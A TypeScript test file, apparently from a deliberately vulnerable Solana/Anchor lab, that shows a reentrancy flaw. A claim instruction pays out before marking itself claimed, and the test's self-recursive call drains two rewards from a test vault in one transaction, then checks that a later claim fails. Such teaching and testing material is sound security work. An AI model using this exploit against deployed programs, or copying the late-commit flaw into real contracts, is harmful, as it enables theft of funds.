/**
 * VULN 10 — Broken check-effects-interactions: state commits TOO LATE.
 *
 * claim() pays the reward first and writes claimed = true last. The caller
 * picks op = 1, which makes the program re-invoke ITSELF (direct A -> A
 * self-recursion, still allowed by the runtime) with op = 0 before the
 * flag commits: the nested frame passes the same false guard and pays a
 * second reward. One transaction, two payouts from the shared vault.
 *
 * Note: the historical variant — re-entering through an attacker-supplied
 * listener/callback program (A -> B -> A) — is rejected by modern Agave
 * with `ReentrancyNotAllowed`; only direct self-recursion survives, and
 * that is exactly what this exploit uses.
 */
import { assert } from "chai";
import {
  PROG_IDS, provider, connection, anchorProgram, findPda, seedsBuf, airdrop,
  newFundedKeypair, createMint, createAccount, mintTo, tokenBalance, sendSelfSigned,
  TOKEN_PROGRAM_ID,
} from "./util";

const REWARD = 100;

describe("vuln10 reentrancy via callback", () => {
  const program = anchorProgram("vuln10_reentrancy", PROG_IDS.vuln10);
  const vaultPda = findPda([seedsBuf("vault")[0]], PROG_IDS.vuln10)[0];
  const claimPdaOf = (user: any) => findPda([seedsBuf("claim")[0], user.publicKey.toBytes()], PROG_IDS.vuln10)[0];

  let mint: any, attacker: any, attackerAta: any, attackerClaim: any;

  before(async () => {
    await airdrop(provider.wallet.publicKey, 50);
    attacker = await newFundedKeypair();

    mint = await createMint(provider.connection, provider.wallet.payer, provider.wallet.publicKey, null, 6);
    attackerAta = await createAccount(provider.connection, provider.wallet.payer, mint, attacker.publicKey);
    await program.methods.initialize().accounts({ mint }).rpc();

    // The reward vault holds exactly two claims' worth.
    await mintTo(provider.connection, provider.wallet.payer, mint, vaultPda, provider.wallet.publicKey, 2 * REWARD);

    attackerClaim = claimPdaOf(attacker);
    await program.methods.initializeClaim()
      .accounts({ claimState: attackerClaim, recipient: attacker.publicKey, payer: attacker.publicKey })
      .signers([attacker])
      .rpc();
  });

  it("reentrant claim pays out twice in one transaction", async () => {
    // op = 1: the program re-invokes claim(op=0) on itself before the
    // claimed flag commits. The claim instruction needs NO signature at
    // all — anyone may trigger it.
    const ix = await program.methods.claim(1)
      .accounts({
        recipient: attacker.publicKey,
        recipientAta: attackerAta,
        vault: vaultPda,
        claimState: attackerClaim,
        tokenProgram: TOKEN_PROGRAM_ID,
        selfProgram: PROG_IDS.vuln10, // needed for the self-CPI
      })
      .instruction();

    // Higher CU budget: the tx contains two full claims.
    await sendSelfSigned([ix], attacker, 600_000);

    assert.equal((await tokenBalance(attackerAta)).toString(), String(2 * REWARD));
    assert.equal((await tokenBalance(vaultPda)).toString(), "0");

    const state = await program.account.claimState.fetch(attackerClaim);
    assert.equal(state.claimed, true);
  });

  it("a second claim is (still) correctly rejected", async () => {
    let failed = false;
    try {
      await sendSelfSigned(
        [
          await program.methods.claim(0)
            .accounts({
              recipient: attacker.publicKey,
              recipientAta: attackerAta,
              vault: vaultPda,
              claimState: attackerClaim,
              tokenProgram: TOKEN_PROGRAM_ID,
              selfProgram: PROG_IDS.vuln10,
            })
            .instruction(),
        ],
        attacker,
      );
    } catch {
      failed = true;
    }
    assert.isTrue(failed, "claim must be single-use once the state finally commits");
  });
});
